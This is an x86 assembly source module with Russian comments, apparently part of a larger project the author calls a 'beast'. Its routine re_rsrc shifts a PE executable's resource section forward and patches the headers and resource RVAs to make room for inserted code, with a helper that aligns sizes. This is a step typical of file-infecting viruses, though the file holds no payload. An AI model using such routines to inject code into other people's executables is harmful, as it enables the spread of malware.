;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ; 
;											rsrc														 ; 
;																										 ; 
;									  re_rsrc, x_align 													 ; 
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;                    
;																										 ;
;										  ЗАМЕТКИ:														 ;
;																										 ; 
;Здесь хочу рассказать вот что: 																		 ; 
;	1) эта полноценная функция (как почти все функции данного зверька), поэтому ее можно свободно 		 ; 
;	   прикручивать и к другим каким-либо темам, просто подключив данный модуль и вызвав с параметрами 	 ; 
;	   данную функу. А также это функа (как пости все функи данного зверька) легко может быть вызвана 	 ; 
;	   к примеру из С++ (stdcall). Так как параметры передаются через стэк. Короче смотри в сорцы :)! 	 ; 
;	2) следует взять себе на заметку, ресурсы - это ДВОИЧНОЕ ОТСОРТИРОВАННОЕ ДЕРЕВО, и ... (здесь 		 ; 
;	   перечисляется прочая хуйня там про уровни и другое), а также что в венде используется только 3 	 ; 
;	   УРОВНЯ (здесь хуйня, какие это уровни). ЗАПОМНИ ИХ КОЛИЧЕСТВО И ЧТО ЭТО ДЕРЕВО, это гораздо 		 ; 
;	   облегчает кодинг с ресурсами.  																	 ; 
;	3) данная функция перестраивает ТОЛЬКО СЕКЦИЮ РЕСУРСОВ! То есть, она физически в файле перемещает    ;
;	   ее, корректирует поля структуры IMAGE_SECTION_HEADER для .rsrc, а также корректирует 			 ;    
;	   OptionalHeader.DataDirectory[2].VirtualAddress. Остальные поля (другой секции, а также 			 ; 
;	   SizeOfImage) должны скорректировать вы сами.														 ;  
;	4) и прочее, смотри в исходники 																	 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 




	             


;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;функция re_rsrc
;перестройка ресурсов
;ВХОД (stdcall) (re_rsrc(LPVOID pExe, IMAGE_SECTION_HEADER *imSh, DWORD Size)):
;	pExe   - база мэпинга 
;	imSh   - указатель в табличке секций на элемент секции ресурсов
;	Size   - число (размер кода) (будет выровнено в этой функе), на которое надо передвинуть секцию 
;			 ресурсов вперед, а также это число используется для корректировки нужных rva в секции 
;			 ресурсов (.rsrc)
;ВЫХОД:
;	(+)
;	EAX    - физический адрес передвинутой секции ресурсов  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
re_rsrc:          
	pushad
	mov		ebp,esp								;[ebp+00] 
	mov		edx,dword ptr [ebp+28h]				;EDX - IMAGE_SECTION_HEADER 
	assume	edx:ptr IMAGE_SECTION_HEADER  
	mov		ebx,dword ptr [ebp+24h]				;EBX - IMAGE_DOS_HEADER 
	assume	ebx:ptr IMAGE_DOS_HEADER 
	mov		esi,ebx 
	add		esi,[edx].PointerToRawData
	add		esi,[edx].SizeOfRawData
	dec		esi  
	add		ebx,[ebx].e_lfanew
	assume	ebx:ptr IMAGE_NT_HEADERS
	push	[ebx].OptionalHeader.FileAlignment
	call	x_align								;EAX - выровненный на FileAlignment переданный размер кода 
	lea		edi,dword ptr [esi+eax] 
	mov		ecx,[edx].SizeOfRawData 
	std
	rep		movsb								;передвигаем секцию ресурсов физически в файле 
	cld 
	inc		edi									;скорректируем EDI - на начало передвинутой секции ресурсов в файле  
 	add		[edx].PointerToRawData,eax			;скорректируем (увеличим) физический адрес (offset) ресурсов в IMAGE_SECTION_HEADER
 	push	[ebx].OptionalHeader.SectionAlignment
 	call	x_align								;EAX - выровненный на SectionAlignment переданный размер кода 
 	add		[edx].VirtualAddress,eax			;скорректируем (увеличим) виртуальный адрес (rva) ресурсов в IMAGE_SECTION_HEADER   
 	add		[ebx].OptionalHeader.DataDirectory[2*8].VirtualAddress,eax	;скорректируем (увеличим) виртуальный адрес (rva) ресурсов в IMAGE_SECTION_HEADER     
	assume	edi:ptr IMAGE_RESOURCE_DIRECTORY
	movzx	edx,[edi].NumberOfNamedEntries		
	movzx	ecx,[edi].NumberOfIdEntries
	add		ecx,edx								;количество элементов в массиве структур IMAGE_RESOURCE_DIRECTORY_ENTRY (1 уровень)  
	push	edi									;[ebp-04]  
	add		edi,sizeof (IMAGE_RESOURCE_DIRECTORY)
	assume	edi:ptr IMAGE_RESOURCE_DIRECTORY_ENTRY  
	push	edi									;[ebp-08]
	push	eax 								;[ebp-12]
;--------------------------------------------------------------------------------------------------------
_cycle_IRDE_1_:
	mov		edx,[edi].OffsetToData 
	btr		edx,31								;на первом уровне всегда стоит старший бит, его надо обнулять 
	add		edx,dword ptr [ebp-08] 
	assume	edx:ptr IMAGE_RESOURCE_DIRECTORY_ENTRY 
	push	ecx									;[ebp-16]	  
    lea		ebx,dword ptr [edx - sizeof(IMAGE_RESOURCE_DIRECTORY)]  
	assume	ebx:ptr IMAGE_RESOURCE_DIRECTORY
	movzx	eax,[ebx].NumberOfNamedEntries
	movzx	ecx,[ebx].NumberOfIdEntries
	add		ecx,eax								;количество элементов в массиве структур IMAGE_RESOURCE_DIRECTORY_ENTRY (2 уровень)
;-------------------------------------------------------------------------------------------------------- 
_cycle_IRDE_2_: 
	push	edx 		 						;[ebp-20]
	push	ecx									;[ebp-24]         
	mov		edx,[edx].OffsetToData
	btr		edx,31
	add		edx,dword ptr [ebp-08]                          
    lea		ebx,dword ptr [edx - sizeof(IMAGE_RESOURCE_DIRECTORY)]  
	movzx	eax,[ebx].NumberOfNamedEntries		;количество элементов в массиве структур IMAGE_RESOURCE_DIRECTORY_ENTRY (3 уровень)   
	movzx	ecx,[ebx].NumberOfIdEntries
	add		ecx,eax   
;-------------------------------------------------------------------------------------------------------- 
_cycle_IRDE_3_: 
	mov		esi,[edx].OffsetToData
	add		esi,dword ptr [ebp-04]
	assume	esi:ptr IMAGE_RESOURCE_DATA_ENTRY
	mov		eax,dword ptr [ebp-12]   
	add		[esi].OffsetToData,eax				;и вот мы добрались до rva - патчим их   	                 
  	add		edx,sizeof (IMAGE_RESOURCE_DIRECTORY_ENTRY)
  	loop	_cycle_IRDE_3_
;--------------------------------------------------------------------------------------------------------
  	pop		ecx 
	pop		edx
	add		edx,sizeof (IMAGE_RESOURCE_DIRECTORY_ENTRY) 
	loop	_cycle_IRDE_2_ 
;-------------------------------------------------------------------------------------------------------- 
	pop		ecx      
	add		edi,sizeof (IMAGE_RESOURCE_DIRECTORY_ENTRY) 
	loop	_cycle_IRDE_1_ 
;-------------------------------------------------------------------------------------------------------- 
	mov		esp,ebp
	push	dword ptr [ebp+04]
	pop		dword ptr [ebp+1Ch]					;EAX - физический адрес передвинутой секции ресурсов 
	popad
	ret		4*3
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи re_rsrc 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;вспомогательная функа x_align
;выравнивание числа (в данном случае размер кода)
;С варик: ALIGN_UP ((x+(y-1)) & (~(y-1)))
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 	
x_align: 
	mov		eax,dword ptr [ebp+2Ch]				;размер кода, который надо выровнять 
	mov		ecx,dword ptr [esp+04]				;выравнивающее значение Alignment 
	dec		ecx
	add		eax,ecx
	not		ecx
	and		eax,ecx
	ret		4 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;конец функции x_align 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 





;XD!
	 